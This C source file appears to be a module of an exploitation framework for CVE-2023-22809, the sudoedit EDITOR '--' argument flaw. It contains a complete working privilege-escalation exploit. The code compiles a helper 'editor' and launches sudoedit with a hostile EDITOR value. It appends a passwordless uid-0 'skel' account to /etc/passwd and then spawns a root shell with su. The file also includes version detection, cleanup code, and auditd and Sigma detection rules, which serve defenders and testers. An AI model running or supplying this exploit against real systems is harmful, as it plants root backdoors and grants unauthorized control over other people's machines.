/*
 * sudoedit_editor_cve_2023_22809 — SKELETONKEY module
 *
 * STATUS: 🟢 STRUCTURAL ESCAPE. No offsets, no leaks, no race window —
 * just a logic bug in sudoedit's EDITOR/VISUAL/SUDO_EDITOR argv parser.
 *
 * The bug (Synacktiv, Jan 2023):
 *   sudoedit splits the user's $EDITOR (or $VISUAL / $SUDO_EDITOR) on
 *   the literal token `--` to separate editor-flags from the filename(s)
 *   sudoedit will pass. The intended semantics are "everything before
 *   `--` is editor argv; everything after is *the* target filename that
 *   sudoers authorized." The bug: sudo never re-validates that the
 *   post-`--` filename equals the filename it auth'd. By setting
 *
 *       EDITOR='vi -- /etc/shadow'
 *
 *   and running `sudoedit /some/allowed/path`, the editor child is
 *   spawned as root with BOTH /some/allowed/path AND /etc/shadow on its
 *   command line — sudoedit opened both for us. The editor then writes
 *   to /etc/shadow as root.
 *
 * Affects: sudo 1.8.0 ≤ V < 1.9.12p2.
 *
 * This is the second sudo module in SKELETONKEY (sudo_samedit is the
 * first; both share family="sudo"). Unlike Baron Samedit (heap layout
 * dependent), this one is offset-free — if sudoedit is in your path
 * and you have *any* sudoedit privilege at all, you write any file.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <pwd.h>

/* ----- helpers ------------------------------------------------------- */

static const char *find_sudo(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudo", "/usr/sbin/sudo", "/bin/sudo",
        "/sbin/sudo", "/usr/local/bin/sudo", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0 && (st.st_mode & S_ISUID))
            return candidates[i];
    }
    return NULL;
}

static const char *find_sudoedit(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudoedit", "/usr/sbin/sudoedit", "/bin/sudoedit",
        "/sbin/sudoedit", "/usr/local/bin/sudoedit", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        /* sudoedit is normally a symlink to sudo and inherits setuid
         * via the underlying file; lstat-then-stat handles both. */
        if (stat(candidates[i], &st) == 0)
            return candidates[i];
    }
    return NULL;
}

/* Returns true if version string is in the vulnerable range
 * [1.8.0, 1.9.12p2). Format examples:
 *   "Sudo version 1.9.5p2"
 *   "Sudo version 1.8.31"
 *   "Sudo version 1.9.13"     (fixed)
 *   "Sudo version 1.9.12p2"   (fixed — fix landed in this release)
 * On parse failure we conservatively assume vulnerable. */
static bool sudo_version_vulnerable(const char *version_str)
{
    int maj = 0, min = 0, patch = 0;
    char ptag = 0;
    int psub = 0;
    /* sudo versions: 1.9.12p2 → maj=1 min=9 patch=12 ptag='p' psub=2 */
    int n = sscanf(version_str, "%d.%d.%d%c%d",
                   &maj, &min, &patch, &ptag, &psub);
    if (n < 3) return true;          /* unparseable → assume worst */

    /* < 1.8.0: not vulnerable (predates the bug) */
    if (maj < 1) return false;
    if (maj == 1 && min < 8) return false;

    /* ≥ 1.9.13: fixed */
    if (maj > 1) return false;
    if (min > 9) return false;
    if (min == 9 && patch > 12) return false;

    /* exactly 1.9.12: vulnerable if no patch tag or patch < 2 */
    if (min == 9 && patch == 12) {
        if (ptag != 'p') return true;   /* 1.9.12 plain */
        return psub < 2;                /* 1.9.12p1 vulnerable, 1.9.12p2 fixed */
    }
    /* everything 1.8.x and 1.9.x where x ≤ 11: vulnerable */
    return true;
}

/* Run `sudo --version` and return the version token (caller-owned
 * buffer). Returns true on success. */
static bool get_sudo_version(const char *sudo_path, char *out, size_t outsz)
{
    char cmd[512];
    snprintf(cmd, sizeof cmd, "%s --version 2>&1 | head -1", sudo_path);
    FILE *p = popen(cmd, "r");
    if (!p) return false;

    char line[256] = {0};
    char *r = fgets(line, sizeof line, p);
    pclose(p);
    if (!r) return false;

    /* "Sudo version 1.9.5p2\n" — skip to digits. */
    char *vp = strstr(line, "version");
    if (!vp) return false;
    vp += strlen("version");
    while (*vp == ' ' || *vp == '\t') vp++;
    char *nl = strchr(vp, '\n');
    if (nl) *nl = 0;

    strncpy(out, vp, outsz - 1);
    out[outsz - 1] = 0;
    return out[0] != 0;
}

/* Parse `sudo -ln` (list, no password) and return one allowed
 * sudoedit target if any. Output snippet looks like:
 *
 *   User kara may run the following commands on host:
 *       (root) NOPASSWD: sudoedit /etc/motd
 *       (root) NOPASSWD: /usr/bin/less /var/log/syslog
 *
 * We look for a line containing 'sudoedit ' and extract the first
 * pathlike token after it. If `sudo -ln` itself prompts for a password
 * or fails, we treat it as "unknown" (PRECOND_FAIL signal). */
static bool find_sudoedit_target(const char *sudo_path, char *out, size_t outsz)
{
    char cmd[512];
    /* -n: non-interactive (no password prompt); -l: list. */
    snprintf(cmd, sizeof cmd, "%s -ln 2>&1", sudo_path);
    FILE *p = popen(cmd, "r");
    if (!p) return false;

    char line[1024];
    bool found = false;
    while (fgets(line, sizeof line, p)) {
        /* sudoedit appears either as the canonical command name or
         * as 'sudo -e'. Handle both. */
        char *needle = strstr(line, "sudoedit ");
        if (!needle) needle = strstr(line, "sudo -e ");
        if (!needle) continue;
        char *path = strchr(needle, '/');
        if (!path) continue;
        /* trim trailing whitespace / newline / comma */
        char *end = path;
        while (*end && *end != ' ' && *end != '\t' && *end != '\n'
               && *end != ',' && *end != ':') end++;
        size_t len = (size_t)(end - path);
        if (len == 0 || len >= outsz) continue;
        memcpy(out, path, len);
        out[len] = 0;
        /* Skip glob/wildcard entries — we can't write a literal path
         * for those without more work. The user's environment may
         * still allow them; we just prefer non-glob entries. */
        if (strchr(out, '*') || strchr(out, '?')) {
            /* keep scanning in case a literal entry exists */
            found = true;
            continue;
        }
        found = true;
        break;
    }
    pclose(p);
    return found;
}

/* ----- detect -------------------------------------------------------- */

static skeletonkey_result_t sudoedit_editor_detect(const struct skeletonkey_ctx *ctx)
{
    const char *sudo_path = find_sudo();
    if (!sudo_path) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudoedit_editor: sudo not installed — no attack surface\n");
        return SKELETONKEY_OK;
    }
    if (!ctx->json)
        fprintf(stderr, "[i] sudoedit_editor: found setuid sudo at %s\n", sudo_path);

    const char *sudoedit_path = find_sudoedit();
    if (!sudoedit_path) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudoedit_editor: no sudoedit binary — bug surface absent\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json)
        fprintf(stderr, "[i] sudoedit_editor: sudoedit at %s\n", sudoedit_path);

    char ver[128] = {0};
    if (!get_sudo_version(sudo_path, ver, sizeof ver)) {
        if (!ctx->json)
            fprintf(stderr, "[?] sudoedit_editor: could not parse `sudo --version`\n");
        return SKELETONKEY_TEST_ERROR;
    }
    if (!ctx->json)
        fprintf(stderr, "[i] sudoedit_editor: sudo reports version '%s'\n", ver);

    bool ver_vuln = sudo_version_vulnerable(ver);
    if (!ver_vuln) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudoedit_editor: sudo ≥ 1.9.12p2 (fixed)\n");
        return SKELETONKEY_OK;
    }
    if (!ctx->json)
        fprintf(stderr, "[!] sudoedit_editor: version is in vulnerable range\n");

    /* The bug only matters if the running user has at least one
     * sudoedit grant in sudoers — otherwise sudoedit refuses before
     * the EDITOR parse runs.  Probe `sudo -ln` (non-interactive). */
    char target[512] = {0};
    bool have_grant = find_sudoedit_target(sudo_path, target, sizeof target);
    if (!have_grant) {
        if (!ctx->json) {
            fprintf(stderr, "[?] sudoedit_editor: user has no detectable sudoedit grant\n");
            fprintf(stderr, "    (sudo -ln may have required a password; if the user is\n"
                            "     actually authorized for sudoedit, run --exploit anyway)\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json)
        fprintf(stderr, "[+] sudoedit_editor: user has sudoedit grant on '%s'\n", target);

    if (!ctx->json) {
        fprintf(stderr, "[!] sudoedit_editor: VULNERABLE — version is pre-fix AND user has sudoedit\n");
        fprintf(stderr, "    PoC: EDITOR='vi -- /etc/shadow' %s '%s' opens both as root\n",
                sudoedit_path, target);
    }
    return SKELETONKEY_VULNERABLE;
}

/* ----- exploit ------------------------------------------------------- */

/* Append a backdoor entry to /etc/passwd: root-uid account "skel" with
 * no password, /bin/sh as shell. We write it into a temp file first,
 * then drive the editor (which is already running as root) to read +
 * write /etc/passwd. */

static const char SK_PASSWD_ENTRY[] =
    "skel::0:0:skeletonkey:/root:/bin/sh\n";

/* The "editor" we tell sudoedit to invoke is actually this small
 * helper: a non-interactive script that appends our line and exits.
 *
 * We pass it via EDITOR='<helper> -- <target>'.  sudoedit splits on
 * the literal `--`, takes <target> as an additional file argument,
 * and execs <helper> argv0=<helper> argv1=<allowed_tmp> argv2=<target>.
 *
 * Our helper just opens argv[2] (the privileged file), appends the
 * backdoor line, closes, and exits 0. argv[1] (the editor-temp that
 * sudoedit created from <allowed>) we leave untouched — sudoedit
 * then copies it back over <allowed>, which is harmless. */

static const char HELPER_SOURCE[] =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <string.h>\n"
    "#include <unistd.h>\n"
    "#include <fcntl.h>\n"
    "int main(int argc, char **argv) {\n"
    "    /* sudoedit invokes us with one editable temp per file. The\n"
    "     * post-`--' target's editable copy is argv[argc-1]. We can't\n"
    "     * write /etc/passwd directly (sudoedit edits a tmp copy and\n"
    "     * then *copies it back as root*), so we modify the tmp copy\n"
    "     * and let sudoedit do the privileged install for us. */\n"
    "    if (argc < 2) return 1;\n"
    "    /* The LAST argv is the post-`--' target (per sudoedit's parser). */\n"
    "    const char *path = argv[argc-1];\n"
    "    int fd = open(path, O_WRONLY|O_APPEND);\n"
    "    if (fd < 0) { perror(\"open\"); return 2; }\n"
    "    const char *line = getenv(\"SKEL_LINE\");\n"
    "    if (!line) line = \"skel::0:0:skeletonkey:/root:/bin/sh\\n\";\n"
    "    write(fd, line, strlen(line));\n"
    "    close(fd);\n"
    "    return 0;\n"
    "}\n";

static bool which_cc(char *out, size_t outsz)
{
    static const char *candidates[] = {
        "/usr/bin/cc", "/usr/bin/gcc", "/bin/cc", "/bin/gcc",
        "/usr/local/bin/gcc", "/usr/local/bin/cc", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        if (access(candidates[i], X_OK) == 0) {
            strncpy(out, candidates[i], outsz - 1);
            out[outsz - 1] = 0;
            return true;
        }
    }
    return false;
}

static bool write_file_str(const char *path, const char *content, mode_t mode)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) return false;
    size_t n = strlen(content);
    bool ok = (write(fd, content, n) == (ssize_t)n);
    close(fd);
    return ok;
}

/* Track what we modified for cleanup. */
static char g_passwd_backup[256] = {0};

static skeletonkey_result_t sudoedit_editor_exploit(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->authorized) {
        fprintf(stderr, "[-] sudoedit_editor: refusing exploit — pass --i-know to authorize\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] sudoedit_editor: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }
    skeletonkey_result_t pre = sudoedit_editor_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] sudoedit_editor: detect() did not return VULNERABLE; refusing\n");
        return pre;
    }

    const char *sudo_path = find_sudo();
    const char *sudoedit_path = find_sudoedit();
    if (!sudo_path || !sudoedit_path) return SKELETONKEY_PRECOND_FAIL;

    /* Target file to clobber (caller-overridable). Default: /etc/passwd
     * because we can append a uid=0 row without a hashing step
     * (vs. /etc/shadow which needs a crypt() blob). */
    const char *target = getenv("SKELETONKEY_SUDOEDIT_TARGET");
    if (!target || !*target) target = "/etc/passwd";

    /* Find an allowed sudoedit grant we can use as the "cover" path. */
    char allowed[512] = {0};
    if (!find_sudoedit_target(sudo_path, allowed, sizeof allowed)) {
        fprintf(stderr,
            "[-] sudoedit_editor: could not auto-discover an allowed sudoedit path.\n"
            "    Set SKELETONKEY_SUDOEDIT_ALLOWED=/path/the/user/can/sudoedit and retry.\n");
        const char *env_allowed = getenv("SKELETONKEY_SUDOEDIT_ALLOWED");
        if (!env_allowed || !*env_allowed) return SKELETONKEY_PRECOND_FAIL;
        strncpy(allowed, env_allowed, sizeof allowed - 1);
    }
    if (!ctx->json)
        fprintf(stderr, "[*] sudoedit_editor: cover=%s  target=%s\n", allowed, target);

    /* Build the helper editor. */
    char cc[256];
    if (!which_cc(cc, sizeof cc)) {
        fprintf(stderr,
            "[-] sudoedit_editor: no cc/gcc available. To exploit without a\n"
            "    compiler we'd need a shipped helper binary (TODO: bundle one).\n"
            "    For a manual repro: EDITOR='vi -- %s' %s '%s' lets you edit\n"
            "    %s interactively as root.\n",
            target, sudoedit_path, allowed, target);
        return SKELETONKEY_PRECOND_FAIL;
    }

    char workdir[] = "/tmp/skeletonkey-sudoedit-XXXXXX";
    if (!mkdtemp(workdir)) {
        perror("mkdtemp");
        return SKELETONKEY_TEST_ERROR;
    }
    if (!ctx->json)
        fprintf(stderr, "[*] sudoedit_editor: workdir = %s\n", workdir);

    char src[1024], helper[1024];
    snprintf(src, sizeof src, "%s/helper.c", workdir);
    snprintf(helper, sizeof helper, "%s/helper", workdir);
    if (!write_file_str(src, HELPER_SOURCE, 0644)) {
        perror("write helper.c");
        goto fail;
    }
    pid_t pid = fork();
    if (pid < 0) { perror("fork"); goto fail; }
    if (pid == 0) {
        execl(cc, cc, "-O2", "-o", helper, src, (char *)NULL);
        perror("execl cc");
        _exit(127);
    }
    int status;
    waitpid(pid, &status, 0);
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "[-] sudoedit_editor: helper compile failed (status=%d)\n", status);
        goto fail;
    }
    chmod(helper, 0755);

    /* Best-effort backup of target (only for /etc/passwd; we
     * cleanup-revert only this case). */
    if (strcmp(target, "/etc/passwd") == 0) {
        snprintf(g_passwd_backup, sizeof g_passwd_backup,
                 "%s/passwd.before", workdir);
        char shcmd[1024];
        snprintf(shcmd, sizeof shcmd, "cp -p /etc/passwd %s 2>/dev/null",
                 g_passwd_backup);
        if (system(shcmd) != 0) {
            /* best-effort */
            g_passwd_backup[0] = 0;
        }
    }

    /* Build EDITOR string: "<helper> -- <target>". sudoedit's argv
     * splitter sees `--` and treats <target> as an extra file. */
    char editor_env[2048];
    snprintf(editor_env, sizeof editor_env, "EDITOR=%s -- %s", helper, target);

    char skel_env[256];
    snprintf(skel_env, sizeof skel_env, "SKEL_LINE=%s", SK_PASSWD_ENTRY);

    /* Construct argv/envp for execve. We need a clean env so the
     * EDITOR string sudo sees is exactly ours. PATH is needed so the
     * compiled helper can be located — except we pass it absolute. */
    char *new_argv[] = {
        (char *)sudoedit_path,
        "-n",                  /* non-interactive — fails if pw needed */
        allowed,
        NULL,
    };
    /* Sudo strips many env vars; EDITOR / VISUAL / SUDO_EDITOR are
     * preserved by default. We use plain EDITOR. */
    char *envp[] = {
        editor_env,
        skel_env,
        "PATH=/usr/sbin:/usr/bin:/sbin:/bin",
        "TERM=dumb",
        NULL,
    };

    if (!ctx->json) {
        fprintf(stderr, "[+] sudoedit_editor: launching sudoedit with hostile EDITOR\n");
        fprintf(stderr, "    %s\n", editor_env);
    }
    fflush(NULL);

    pid = fork();
    if (pid < 0) { perror("fork"); goto fail; }
    if (pid == 0) {
        execve(sudoedit_path, new_argv, envp);
        perror("execve(sudoedit)");
        _exit(127);
    }
    waitpid(pid, &status, 0);

    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "[-] sudoedit_editor: sudoedit exited status=%d\n",
                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
        fprintf(stderr,
            "    Common causes: sudo is patched (1.9.12p2+), user lacks a\n"
            "    sudoedit grant on '%s', or sudoers requires a password\n"
            "    (drop -n and retry interactively).\n", allowed);
        goto fail;
    }

    /* Verify the privileged file changed. For /etc/passwd we grep for
     * our marker; for other targets we just report success and leave
     * verification to the operator. */
    if (strcmp(target, "/etc/passwd") == 0) {
        if (system("grep -q '^skel::0:0:' /etc/passwd") != 0) {
            fprintf(stderr,
                "[-] sudoedit_editor: sudoedit succeeded but /etc/passwd was\n"
                "    not modified. The host's sudo may be patched even though\n"
                "    its --version banner looks vulnerable (vendor backport).\n");
            goto fail;
        }
        if (!ctx->json)
            fprintf(stderr, "[+] sudoedit_editor: /etc/passwd now contains the 'skel' uid=0 entry\n");
    } else {
        if (!ctx->json)
            fprintf(stderr, "[+] sudoedit_editor: helper wrote to %s (verify manually)\n", target);
    }

    /* Follow-on: spawn a root shell via the newly-added passwd entry,
     * the way dirty_pipe / dirty_cow modules do. We use `su skel`
     * with an empty password. */
    if (ctx->no_shell) {
        if (!ctx->json)
            fprintf(stderr, "[i] sudoedit_editor: --no-shell set; leaving you with the backdoor entry\n");
        return SKELETONKEY_EXPLOIT_OK;
    }

    if (strcmp(target, "/etc/passwd") == 0 && ctx->full_chain) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudoedit_editor: spawning root shell via `su skel`\n");
        fflush(NULL);
        /* su with no controlling TTY needs `-c sh -i` for an interactive
         * shell. We exec into the user's terminal. */
        execlp("su", "su", "skel", "-c", "/bin/sh -p -i", (char *)NULL);
        perror("execlp(su)");
    } else {
        if (!ctx->json)
            fprintf(stderr,
                "[i] sudoedit_editor: backdoor installed. `su skel` (no password)\n"
                "    or pass --full-chain on the cli to auto-pop.\n");
    }
    return SKELETONKEY_EXPLOIT_OK;

fail:
    /* Helper / src cleanup — leave passwd-backup for cleanup() if we
     * recorded one (so cleanup can revert). */
    unlink(src);
    unlink(helper);
    if (!g_passwd_backup[0]) rmdir(workdir);
    return SKELETONKEY_EXPLOIT_FAIL;
}

/* ----- cleanup ------------------------------------------------------- */

static skeletonkey_result_t sudoedit_editor_cleanup(const struct skeletonkey_ctx *ctx)
{
    /* Best-effort revert. Three things we may have touched:
     *   1. /etc/passwd: drop the 'skel::0:0:' line (sed -i; only safe
     *      if we are root or the file is otherwise writable). If we
     *      successfully exploited, the user is presumably root in the
     *      spawned shell — cleanup is usually run from that shell. */
    if (geteuid() == 0) {
        if (g_passwd_backup[0] && access(g_passwd_backup, R_OK) == 0) {
            char cmd[1024];
            snprintf(cmd, sizeof cmd,
                     "cp -p %s /etc/passwd 2>/dev/null", g_passwd_backup);
            if (system(cmd) == 0) {
                if (!ctx->json)
                    fprintf(stderr, "[+] sudoedit_editor: restored /etc/passwd from %s\n",
                            g_passwd_backup);
            }
        } else {
            /* No backup — fall back to deleting just our line. */
            if (system("sed -i '/^skel::0:0:/d' /etc/passwd 2>/dev/null") == 0) {
                if (!ctx->json)
                    fprintf(stderr, "[+] sudoedit_editor: removed 'skel' entry from /etc/passwd\n");
            }
        }
    } else {
        if (!ctx->json)
            fprintf(stderr,
                "[?] sudoedit_editor: cleanup requires root. Re-run as root or\n"
                "    manually remove the 'skel' line from /etc/passwd.\n");
    }
    if (system("rm -rf /tmp/skeletonkey-sudoedit-* 2>/dev/null") != 0) {
        /* harmless */
    }
    return SKELETONKEY_OK;
}

/* ----- detection rules ----------------------------------------------- */

static const char sudoedit_editor_auditd[] =
    "# CVE-2023-22809 — sudoedit EDITOR argv-escape detection\n"
    "# Watch sudoedit invocations; the bug requires EDITOR / VISUAL /\n"
    "# SUDO_EDITOR to contain the literal token `--`. auditd cannot match\n"
    "# env vars directly via -F, but logging every execve(sudoedit) lets\n"
    "# downstream tooling (Sigma, splunk, etc.) inspect EXECVE record env.\n"
    "-w /usr/bin/sudoedit -p x -k skeletonkey-sudoedit-22809\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudoedit -k skeletonkey-sudoedit-22809-execve\n"
    "-a always,exit -F arch=b32 -S execve -F path=/usr/bin/sudoedit -k skeletonkey-sudoedit-22809-execve\n"
    "# sudo itself can run as `sudo -e` which takes the sudoedit path too:\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudo -k skeletonkey-sudoedit-22809-sudo-e\n";

static const char sudoedit_editor_sigma[] =
    "title: Possible CVE-2023-22809 sudoedit EDITOR escape\n"
    "id: a4e3f1a8-skeletonkey-sudoedit-22809\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects sudoedit (or `sudo -e`) invocations where the EDITOR,\n"
    "  VISUAL, or SUDO_EDITOR environment variable contains the literal\n"
    "  token `--`. This is the exact signature of the Synacktiv\n"
    "  CVE-2023-22809 argv-escape: post-`--` filenames are silently\n"
    "  promoted to additional files that sudoedit opens as root.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  sudoedit_exec:\n"
    "    type: 'EXECVE'\n"
    "    exe|endswith:\n"
    "      - '/sudoedit'\n"
    "      - '/sudo'\n"
    "  hostile_editor_env:\n"
    "    - 'EDITOR=*--*'\n"
    "    - 'VISUAL=*--*'\n"
    "    - 'SUDO_EDITOR=*--*'\n"
    "  privileged_target:\n"
    "    - '/etc/shadow'\n"
    "    - '/etc/passwd'\n"
    "    - '/etc/sudoers'\n"
    "    - '/root/'\n"
    "  condition: sudoedit_exec and hostile_editor_env\n"
    "  # Bump to 'critical' when privileged_target matches as well.\n"
    "fields: [User, EDITOR, VISUAL, SUDO_EDITOR]\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1548_003, cve.2023.22809]\n";

/* ----- module registration ------------------------------------------- */

const struct skeletonkey_module sudoedit_editor_module = {
    .name           = "sudoedit_editor",
    .cve            = "CVE-2023-22809",
    .summary        = "sudoedit EDITOR/VISUAL `--` argv escape → arbitrary file write as root",
    .family         = "sudo",
    .kernel_range   = "sudo 1.8.0 ≤ V < 1.9.12p2 (userspace bug; setuid sudoedit)",
    .detect         = sudoedit_editor_detect,
    .exploit        = sudoedit_editor_exploit,
    .mitigate       = NULL,        /* mitigation = upgrade sudo */
    .cleanup        = sudoedit_editor_cleanup,
    .detect_auditd  = sudoedit_editor_auditd,
    .detect_sigma   = sudoedit_editor_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_sudoedit_editor(void)
{
    skeletonkey_register(&sudoedit_editor_module);
}
